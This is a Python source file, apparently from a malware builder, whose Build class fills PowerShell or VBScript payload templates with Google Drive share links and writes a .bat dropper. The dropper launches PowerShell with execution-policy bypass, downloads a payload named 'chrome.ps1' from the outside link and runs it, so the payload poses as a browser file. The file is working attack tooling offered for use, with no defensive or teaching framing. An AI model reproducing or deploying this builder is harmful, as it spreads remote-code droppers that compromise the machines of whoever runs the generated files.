
import os
from colors import Colors
from drive import Drive
import shutil

class Build :

	def __init__(self, extension, filetype, token) :
		self.extension = extension
		self.filetype = filetype
		self.token = token
		self.color = Colors()

	def builder(self) :
		
		try:

			path = "output/builds/" # Builds files

			if self.filetype == "bat":

				payloads = "data/payloads/powershell/powershell.ps1" # Payload file
			elif self.filetype == "vbs" :
				payloads = "data/payloads/VBScript/vbs.txt" # Payload file

			build = "{}.{}".format(self.extension, self.filetype) # Make .bat file
			powershell = "{}.{}".format("chrome", "ps1") # Make .bat file

			if not os.path.exists("output/builds/{}".format(build)):
				print("{} First upload the files to get shared links".format(self.color.yellows("[!]")))
				with open(payloads, 'r') as f :

					# Set the drop URL or do not
					payload = f.read()
					payload = payload.replace('******', "******")

					if self.filetype == "bat":

						with open(os.path.join(path, powershell), 'a') as pwsh :
						# Write the new file
							pwsh.write(payload)
						pwsh.close()

						with open(os.path.join(path, build), 'a') as builder :
							# Write the new file
							batch = "@ECHO OFF PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command (new-object net.webclient).DownloadFile('******','chrome.ps1'); ./chrome.ps1 PAUSE"
							batch = batch.replace('******', "******")
							builder.write(batch)
						builder.close()
				f.close()
			else:

				
				if os.path.exists("output/builds/%s" % build) :
					os.remove("output/builds/%s" % build)
					os.remove("output/builds/%s" % powershell)

				paths = Drive(self.extension, self.filetype, self.token).ShareLinks()

				# print(paths)

				with open(payloads, 'r') as f :

					# Set the drop URL or do not
					payload = f.read()
					payload = payload.replace('******', paths[0])

					if self.filetype == "bat":

						with open(os.path.join(path, powershell), 'w') as pwsh :
						# Write the new file
							pwsh.write(payload)
						pwsh.close()

						with open(os.path.join(path, build), 'w') as builder :
							# Write the new file
							batch = "@ECHO OFF PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command (new-object net.webclient).DownloadFile('******','chrome.ps1'); ./chrome.ps1 PAUSE"
							batch = batch.replace('******', paths[1])
							builder.write(batch)
						builder.close()
				f.close()
		except IOError as e:
			raise e

